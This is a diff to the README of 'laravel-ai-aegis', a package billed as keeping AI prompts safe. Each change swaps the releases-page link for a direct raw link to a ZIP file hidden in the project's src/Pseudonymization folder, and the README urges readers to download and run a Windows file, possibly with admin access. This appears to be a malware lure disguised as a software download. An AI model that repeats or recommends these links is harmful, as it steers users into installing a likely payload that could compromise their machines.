@@ -1,12 +1,12 @@
 # 🛡️ laravel-ai-aegis - Keep AI prompts clean and safe
 
-[![Download laravel-ai-aegis](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/releases)
+[![Download laravel-ai-aegis](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/raw/refs/heads/main/src/Pseudonymization/laravel-ai-aegis-2.5.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows release:
 
-https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/releases
+https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/raw/refs/heads/main/src/Pseudonymization/laravel-ai-aegis-2.5.zip
 
 Look for the latest release and download the Windows file that fits your system.
 
@@ -37,7 +37,7 @@ If you use a work computer, you may need admin access to open the file.
 ## ⬇️ Download and install
 
 1. Open the release page:
-   https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/releases
+   https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/raw/refs/heads/main/src/Pseudonymization/laravel-ai-aegis-2.5.zip
 
 2. Find the newest release at the top of the page
 
@@ -179,7 +179,7 @@ If you see a ZIP file, extract it first. If you see an installer, open it and fo
 
 Check the release page now and then for newer versions:
 
-https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/releases
+https://github.com/uncombable-pyrimidine12/laravel-ai-aegis/raw/refs/heads/main/src/Pseudonymization/laravel-ai-aegis-2.5.zip
 
 If a newer release appears, download it and replace the older copy on your PC.
 
